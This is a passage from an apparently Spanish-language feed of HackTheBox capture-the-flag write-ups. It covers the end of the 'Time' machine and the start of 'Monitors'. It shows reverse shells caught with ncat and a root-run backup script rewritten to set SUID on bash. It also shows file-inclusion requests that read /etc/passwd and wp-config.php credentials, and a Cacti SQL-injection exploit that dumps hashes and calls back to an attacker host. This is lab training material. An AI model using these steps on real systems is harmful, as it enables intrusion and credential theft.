Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Seguidamente nos ponemos en escucha en el puerto especifico, en este caso el &lt;code&gt;443&lt;/code&gt; y enviamos la instrucción.&lt;/p&gt;

&lt;p&gt;Recibimos la petición&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.214 - - [12/Jun/2023 23:13:26] &quot;GET /inject.sql HTTP/1.1&quot; 200 -
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;y obnenemos acceso como el usuario &lt;code&gt;pericles&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.214.
Ncat: Connection from 10.10.10.214:38128.
bash: cannot set terminal process group (857): Inappropriate ioctl for device
bash: no job control in this shell
pericles@time:/var/www/html$ whoami
whoami
pericles
pericles@time:/var/www/html$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Como siempre vamos a configurar nuestra &lt;code&gt;tty&lt;/code&gt; full interactiva&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;pericles@time:/var/www/html$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
pericles@time:/var/www/html$ ^Z
zsh: suspended  ncat -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  ncat -nlvp 443
                                reset xterm
pericles@time:/var/www/html$ export TERM=xterm
pericles@time:/var/www/html$ export SHELL=bash 
pericles@time:/var/www/html$ stty rows 45 columns 184
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Nos dirigimos al directorio personal del usuario &lt;code&gt;pericles&lt;/code&gt; y visializamos la primera flag &lt;code&gt;user.txt&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;pericles@time:/var/www/html$ cd /home
pericles@time:/home$ ls
pericles
pericles@time:/home$ cd pericles/
pericles@time:/home/pericles$ ls
snap  user.txt
pericles@time:/home/pericles$ cat user.txt 
5598d4c823ca1aadd34004c1ed4cbfc8
pericles@time:/home/pericles$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;Escalada de Privilegios &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Para poder elevar privilegios primeramente a enumerar ver la lista de temporalizadores para ver información util sobre las tareas programadas en el sistema, utilzando el comando &lt;code&gt;systenctl list-timers&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;pericles@time:/home/pericles$ systemctl list-timers
NEXT                        LEFT          LAST                        PASSED               UNIT                         ACTIVATES                     
Mon 2023-06-12 23:21:41 UTC 3s left       Mon 2023-06-12 23:21:31 UTC 6s ago               timer_backup.timer           timer_backup.service          
Mon 2023-06-12 23:39:00 UTC 17min left    Mon 2023-06-12 23:09:00 UTC 12min ago            phpsessionclean.timer        phpsessionclean.service       
Tue 2023-06-13 00:00:00 UTC 38min left    Mon 2023-06-12 20:41:25 UTC 2h 40min ago         logrotate.timer              logrotate.service             
Tue 2023-06-13 00:00:00 UTC 38min left    Mon 2023-06-12 20:41:25 UTC 2h 40min ago         man-db.timer                 man-db.service                
Tue 2023-06-13 00:09:59 UTC 48min left    Tue 2021-02-09 14:42:14 UTC 2 years 4 months ago motd-news.timer              motd-news.service             
Tue 2023-06-13 03:56:23 UTC 4h 34min left Thu 2020-10-22 18:44:20 UTC 2 years 7 months ago apt-daily.timer              apt-daily.service             
Tue 2023-06-13 06:16:25 UTC 6h left       Mon 2023-06-12 21:40:37 UTC 1h 41min ago         apt-daily-upgrade.timer      apt-daily-upgrade.service     
Tue 2023-06-13 14:30:45 UTC 15h left      Mon 2023-06-12 22:46:51 UTC 34min ago            fwupd-refresh.timer          fwupd-refresh.service         
Tue 2023-06-13 20:56:20 UTC 21h left      Mon 2023-06-12 20:56:20 UTC 2h 25min ago         systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
Sun 2023-06-18 03:10:37 UTC 5 days left   Mon 2023-06-12 20:42:05 UTC 2h 39min ago         e2scrub_all.timer            e2scrub_all.service           
Mon 2023-06-19 00:00:00 UTC 6 days left   Mon 2023-06-12 20:41:25 UTC 2h 40min ago         fstrim.timer                 fstrim.service                
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Obervamos que se esta ejecutando un &lt;code&gt;timer_backup&lt;/code&gt;, ahora para enumerar los procesos que se estan ejecutando en el sistema, vamos a crearnos un pequeño script en bash de nombre &lt;code&gt;procmon.sh&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;#!/bin/bash

old_process=$(ps -eo user,command)

while true; do
  new_process=$(ps -eo user,command)
  diff &amp;lt;(echo &quot;$old_process&quot;) &amp;lt;(echo &quot;$new_process&quot;) | grep &quot;[\&amp;gt;\&amp;lt;]&quot; | grep -vE &quot;procmon|command|kworker&quot; 
  old_process=$new_process
done
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lo ejecutamos en la maquina victima y vemos que el usuario &lt;code&gt;root&lt;/code&gt; esta ejecutando el arhivo &lt;code&gt;timer_backup.sh&lt;/code&gt; a intervalos regulares de tiempo.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;root     /bin/sh -e /usr/lib/php/sessionclean
root     /bin/sh -e /usr/lib/php/sessionclean
root     /lib/systemd/systemd-udevd
root     /lib/systemd/systemd-udevd
root     /lib/systemd/systemd-udevd
root     /bin/bash /usr/bin/timer_backup.sh
root     zip -r website.bak.zip /var/www/html
root     /bin/bash /usr/bin/timer_backup.sh
root     zip -r website.bak.zip /var/www/html
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Viendo las propiedades del archivo, vemos que somos propieatarios, por tanto tenemos permiso de escritura.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;pericles@time:/home/pericles$ ls -l /usr/bin/timer_backup.sh
-rwxrw-rw- 1 pericles pericles 88 Jun 12 23:40 /usr/bin/timer_backup.sh
pericles@time:/home/pericles$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lo siguiente que haremos sera modificar el archivo, añadiendole una instruccion que nos otorgue el privilegio &lt;code&gt;suid&lt;/code&gt; a la &lt;code&gt;bash&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;pericles@time:/home/pericles$ cat /usr/bin/timer_backup.sh
#!/bin/bash
chmod  u+s /bin/bash
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ya que el usuario &lt;code&gt;root&lt;/code&gt; nos ejecutara el archivo despues de unos segundos verificamos si nos asigno el permiso correspondiente a la &lt;code&gt;bash&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;pericles@time:/home/pericles$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1183448 Feb 25  2020 /bin/bash
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lo unico que nos queda por hacer seria ejecutar &lt;code&gt;bash -p&lt;/code&gt; y nos convertiriamos en el usuario &lt;code&gt;root&lt;/code&gt;, ahora vamos a su directorio personal y visualizamos la segunda flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;pericles@time:/home/pericles$ bash -p
bash-5.0# whoami
root
bash-5.0# cd /root
bash-5.0# cat root.txt
a527d7fbd3e113aeb96d956af2900de8
&lt;/code&gt;&lt;/pre&gt;
</description>
        <pubDate>Mon, 12 Jun 2023 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/hackthebox/htb-writeup-Time</link>
        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Time</guid>
        
        <category>Jackson CVE-2019-12384 Exploitation</category>
        
        <category>SSRF to RCE</category>
        
        <category>Abusing Cron Job</category>
        
        
        <category>hackthebox</category>
        
      </item>
    
      <item>
        <title>Maquina Monitors - htb writeup</title>
        <description>&lt;p&gt;El dia de hoy vamos a estar resolviendo la maquina &lt;code&gt;Monitors&lt;/code&gt; de &lt;code&gt;hackthebox&lt;/code&gt; que es una maquina &lt;code&gt;Linux&lt;/code&gt; de dificultad &lt;code&gt;Dificil&lt;/code&gt;. Para explotar esta maquina abusaremos una vulnerabilidad que reside en el plugin &lt;code&gt;spritz&lt;/code&gt; de &lt;code&gt;Wordpress&lt;/code&gt; que nos permitira realizar leer archivos de la maquina victima, despues explotaremos un servicio de &lt;code&gt;cacti&lt;/code&gt; con una version vulnerable, seguidamente abusaremos de un ataque de &lt;code&gt;deserealizacion&lt;/code&gt; con el cual ganaremos acceso a un contenedor y finalmente nos aprovecharemos de la capability &lt;code&gt;sysmodule&lt;/code&gt; para escapar del contenedor y ganar acceso a la maquina real como el usuario &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Vamos a comenzar como siempre creando un directorio con el nombre de la maquina:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Monitors
❯ ls
 Monitors
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
mkt () {
	mkdir {nmap,content,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;enumeración&quot;&gt;Enumeración &lt;a href=&quot;#enumeración&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Ahora que tenemos nuestros directorios proseguimos con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.238
PING 10.10.10.238 (10.10.10.238) 56(84) bytes of data.
64 bytes from 10.10.10.238: icmp_seq=1 ttl=63 time=108 ms

--- 10.10.10.238 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 108.365/108.365/108.365/0.000 ms
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Vemos que la maquina nos responde con un &lt;code&gt;ttl&lt;/code&gt; de &lt;code&gt;63&lt;/code&gt; correspondiente a una maquina &lt;code&gt;linux&lt;/code&gt;, ahora procederemos a el scaneo de puertos con la ayuda de &lt;code&gt;nmap&lt;/code&gt;:&lt;/p&gt;

&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;Escaneo de Puertos&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Parámetro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;allPorts&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.238 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-14 21:04 GMT
Initiating SYN Stealth Scan at 21:04
Scanning 10.10.10.238 [65535 ports]
Discovered open port 22/tcp on 10.10.10.238
Discovered open port 80/tcp on 10.10.10.238
Completed SYN Stealth Scan at 21:04, 28.62s elapsed (65535 total ports)
Nmap scan report for 10.10.10.238
Host is up, received user-set (2.6s latency).
Scanned at 2023-05-14 21:04:30 GMT for 29s
Not shown: 60433 closed tcp ports (reset), 5100 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 28.72 seconds
           Raw packets sent: 110162 (4.847MB) | Rcvd: 86054 (3.442MB)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Podemos ver puertos interesantes que se encuentran abiertos como &lt;code&gt;22 ssh&lt;/code&gt; y &lt;code&gt;80 http&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;Escaneo de Version y Servicios.&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p22,80 10.10.10.238 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-14 21:05 GMT
Nmap scan report for monitors.htb (10.10.10.238)
Host is up (0.13s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ba:cc:cd:81:fc:91:55:f3:f6:a9:1f:4e:e8:be:e5:2e (RSA)
|   256 69:43:37:6a:18:09:f5:e7:7a:67:b8:18:11:ea:d7:65 (ECDSA)
|_  256 5d:5e:3f:67:ef:7d:76:23:15:11:4b:53:f8:41:3a:94 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Welcome to Monitor &amp;amp;#8211; Taking hardware monitoring seriously
|_http-generator: WordPress 5.5.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.43 seconds
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Visulizamos la versión de los puertos escaneados:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Puerto&lt;/th&gt;
      &lt;th&gt;Servicio&lt;/th&gt;
      &lt;th&gt;Versión&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;22&lt;/td&gt;
      &lt;td&gt;SSH&lt;/td&gt;
      &lt;td&gt;OpenSSH 7.6p1&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;80&lt;/td&gt;
      &lt;td&gt;HTTP&lt;/td&gt;
      &lt;td&gt;Apache httpd 2.4.29&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;explotación&quot;&gt;Explotación &lt;a href=&quot;#explotación&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Primero ya que &lt;code&gt;nmap&lt;/code&gt; no detecto el servicio del puerto &lt;code&gt;80&lt;/code&gt; se encuentra abierto, trataremos de identificar las tecnologias que usa con la ayuda de &lt;code&gt;whatweb&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ whatweb http://10.10.10.238
http://10.10.10.238 [403 Forbidden] Apache[2.4.29], Country[RESERVED][ZZ], Email[admin@monitors.htb], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.238]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Podemos ver que se esta aplicando virtual hosting, asi que procederemos a agregar el dominio a nuestro &lt;code&gt;/etc/hosts&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Volvemos a usar &lt;code&gt;whatweb&lt;/code&gt;, pero esta vez aputando al dominio y esta vez la herramienta nos reporta el gestor de contenido que corresponde a un &lt;code&gt;wordpress&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ whatweb http://monitors.htb
http://monitors.htb [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.238], JQuery, MetaGenerator[WordPress 5.5.1], Script[text/javascript], Title[Welcome to Monitor &amp;amp;#8211; Taking hardware monitoring seriously], UncommonHeaders[link], WordPress[5.5.1]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Procedemos a abrir la pagina en nuestro navegador.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Monitors/moni1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos un articulo publicado por el usuario &lt;code&gt;admin&lt;/code&gt;, y para validar que este es un usuario valido podemos intentar logearnos como este en la ruta &lt;code&gt;wp-login.php&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Monitors/moni2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora al tratarse de un &lt;code&gt;wordpress&lt;/code&gt; trataremos de buscar plugins vulnerables asociados, para ello usaremos el diccionario &lt;code&gt;wp-plugins.fuzz.txt&lt;/code&gt; del repositorio de &lt;code&gt;seclists&lt;/code&gt;, enconjunto con nuestra herramienta de confianza &lt;code&gt;wfuzz&lt;/code&gt;.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/danielmiessler/SecLists&quot;&gt;https://github.com/danielmiessler/SecLists&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ wfuzz -c --hc=404 -t 100 -w /opt/SecLists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt http://monitors.htb/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://monitors.htb/FUZZ
Total requests: 13368

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                               
=====================================================================


Total time: 36.76465
Processed Requests: 13368
Filtered Requests: 13368
Requests/sec.: 363.6101
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;wfuzz&lt;/code&gt; no logro descubrir un plugin valido, pero podemos tratar de acceder a la ruta de los &lt;code&gt;plugins&lt;/code&gt; y ver si tenemos permiso para lista el directorio.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Monitors/moni3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Como podemos lista el contenido vemos el servicio usa &lt;code&gt;spritz&lt;/code&gt; como plugin, asi que trataremos de buscar si existe una vulnerabilidad asociada a ello con &lt;code&gt;searchsploit&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ searchsploit spritz
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                       |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
WordPress Plugin WP with Spritz 1.0 - Remote File Inclusion                                                                                          | php/webapps/44544.php
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Efectivamente tal y como nos reporta existe una vulnerabilidad asociada &lt;code&gt;Remote File Inclusion&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Analizando el codigo del &lt;code&gt;exploit&lt;/code&gt; vemos que aprovecha una ruta para poder lista archivos de la maquina.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ cat 44544.php

1. Version Disclosure

/wp-content/plugins/wp-with-spritz/readme.txt

2. Source Code

if(isset($_GET['url'])){
$content=file_get_contents($_GET['url']);

3. Proof of Concept

/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/passwd
/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=http(s)://domain/exec
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Probamos a listar el &lt;code&gt;/etc/hosts&lt;/code&gt; de la maquina victima y nos lo muestra con exito.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ curl -s -X GET &quot;http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/passwd&quot;
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
marcus:x:1000:1000:Marcus Haynes:/home/marcus:/bin/bash
Debian-snmp:x:112:115::/var/lib/snmp:/bin/false
mysql:x:109:114:MySQL Server,,,:/nonexistent:/bin/false
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Como sabemos que el servicio usa &lt;code&gt;apache&lt;/code&gt;, podemos trata de listar el &lt;code&gt;000-default.conf&lt;/code&gt; y tratar de filtrar información.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ curl -s -X GET &quot;http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../../etc/apache2/sites-enabled/000-default.conf&quot;
# Default virtual host settings
# Add monitors.htb.conf
# Add cacti-admin.monitors.htb.conf
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vemos que existe otro &lt;code&gt;subdominio&lt;/code&gt;, asi que procederemos a agregarlo tambien a nuestro &lt;code&gt;/etc/hosts&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ echo &quot;10.10.10.238 cacti-admin.monitors.htb&quot; &amp;gt;&amp;gt; /etc/hosts
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora visiualizamos el servicio en el navegador.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Monitors/moni4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos que usa &lt;code&gt;cacti&lt;/code&gt; y con una version concreta correspondiente a la &lt;code&gt;1.2.12&lt;/code&gt; y que tiene una vulnerabilidad asociada.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Cacti es una completa solución para la generación de gráficos en red, diseñada para aprovechar el poder de almacenamiento y la funcionalidad para gráficas que poseen las aplicaciones RRDtool.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ searchsploit cacti 1.2.12
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                       |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Cacti 1.2.12 - 'filter' SQL Injection                                                                                                                | php/webapps/49810.py
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Examinando el &lt;code&gt;exploit&lt;/code&gt; vemos que deriva en una ejecución de comandos, y al ejecutarlo nos pide un &lt;code&gt;usuario y contraseña'&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python3 cacti.py
usage: cacti.py [-h] -t &amp;lt;target/host URL&amp;gt; -u &amp;lt;user&amp;gt; -p &amp;lt;password&amp;gt; --lhost &amp;lt;lhost&amp;gt; --lport &amp;lt;lport&amp;gt;
cacti.py: error: the following arguments are required: -t, -u, -p, --lhost, --lport
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Debemos recordar que al enfrentarnos a un &lt;code&gt;wordpress&lt;/code&gt;, podemos listar el &lt;code&gt;wp-config.php&lt;/code&gt; y obtener unas credenciales validas, para ello podemos usar el &lt;code&gt;exploit spritz&lt;/code&gt; y un wraper encoding de &lt;code&gt;base64&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ curl -s -X GET &quot;http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=php://filter/convert.base64-encode/resource=../../../wp-config.php&quot; | base64 -d
&amp;lt;?php
*
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to &quot;wp-config.php&quot; and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'wpadmin' );

/** MySQL database password */
define( 'DB_PASSWORD', 'BestAdministrator@2020!' );
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Obtemos unas credenciales que justamente son validas para el servicio &lt;code&gt;cacti&lt;/code&gt;, asi que usaremos el &lt;code&gt;exploit&lt;/code&gt; con los parametros necesarios y nos pondremos en escucha con &lt;code&gt;ncat&lt;/code&gt; en el puerto &lt;code&gt;443&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python3 cacti.py -t http://cacti-admin.monitors.htb -u 'admin' -p 'BestAdministrator@2020!' --lhost 10.10.16.3 --lport 443
[+] Connecting to the server...
[+] Retrieving CSRF token...
[+] Got CSRF token: sid:127e441cbfce235feca8a95a0ffa545f8f9f4f02,1684101076
[+] Trying to log in...
[+] Successfully logged in!

[+] SQL Injection:
&quot;name&quot;,&quot;hex&quot;
&quot;admin&quot;,&quot;$2y$10$TycpbAes3hYvzsbRxUEbc.dTqT0MdgVipJNBYu8b7rUlmB8zn8JwK&quot;
&quot;guest&quot;,&quot;43e9a4ab75570f5b&quot;

[+] Check your nc listener!
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Recibimos la conexion como &lt;code&gt;www-data&lt;/code&gt; y estamos en la maquina victima.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ncat -nlvp 443
